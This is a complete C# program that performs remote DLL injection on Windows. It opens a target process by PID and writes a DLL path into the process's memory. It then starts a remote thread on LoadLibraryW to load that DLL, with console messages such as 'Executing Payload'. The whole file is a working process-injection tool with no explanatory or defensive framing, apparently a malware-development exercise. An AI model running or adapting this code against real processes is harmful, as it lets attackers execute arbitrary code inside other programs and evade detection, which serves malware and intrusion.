using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;

    static bool InjectDLL(int pid, string dllPath)
    {
        bool bSTATE = true;
        IntPtr pLoadLibraryW = IntPtr.Zero;
        IntPtr pAddress = IntPtr.Zero;
        uint dwSizeToWrite = (uint)((dllPath.Length + 1) * sizeof(char));
        UIntPtr lpNumberOfBytesWritten;
        IntPtr hThread = IntPtr.Zero;
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[!] OpenProcess Failed With Error : {0}", Marshal.GetLastWin32Error());
            bSTATE = false; goto _EndOfFunction;
        }

        pLoadLibraryW = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
        if (pLoadLibraryW == IntPtr.Zero)
        {
            Console.WriteLine("[!] GetProcAddress Failed With Error : {0}", Marshal.GetLastWin32Error());
            bSTATE = false; goto _EndOfFunction;
        }

        pAddress = VirtualAllocEx(hProcess, IntPtr.Zero, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pAddress == IntPtr.Zero)
        {
            Console.WriteLine("[!] VirtualAllocEx Failed With Error : {0}", Marshal.GetLastWin32Error());
            bSTATE = false; goto _EndOfFunction;
        }

        Console.WriteLine("[i] pAddress Allocated At : 0x{0:X} Of Size : {1}", pAddress, dwSizeToWrite);
        Console.WriteLine("[#] Press <Enter> To Write ... ");
        Console.ReadLine();

        byte[] bytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        if (!WriteProcessMemory(hProcess, pAddress, bytes, dwSizeToWrite, out lpNumberOfBytesWritten) || lpNumberOfBytesWritten.ToUInt32() != dwSizeToWrite)
        {
            Console.WriteLine("[!] WriteProcessMemory Failed With Error : {0}", Marshal.GetLastWin32Error());
            bSTATE = false; goto _EndOfFunction;
        }

        Console.WriteLine("[i] Successfully Written {0} Bytes", lpNumberOfBytesWritten);
        Console.WriteLine("[#] Press <Enter> To Run ... ");
        Console.ReadLine();
        Console.WriteLine("[i] Executing Payload ... ");
        hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pLoadLibraryW, pAddress, 0, out _);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[!] CreateRemoteThread Failed With Error : {0}", Marshal.GetLastWin32Error());
            bSTATE = false; goto _EndOfFunction;
        }

        Console.WriteLine("[+] DONE !");
    _EndOfFunction:
        if (hThread != IntPtr.Zero)
            CloseHandle(hThread);
        if (hProcess != IntPtr.Zero)
            CloseHandle(hProcess);
        return bSTATE;
    }

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: <pid> <dllPath>");
            return;
        }

        int pid = int.Parse(args[0]);
        string dllPath = args[1];

        if (!File.Exists(dllPath))
        {
            Console.WriteLine("The specified DLL path does not exist.");
            return;
        }

        InjectDLL(pid, dllPath);
    }
}
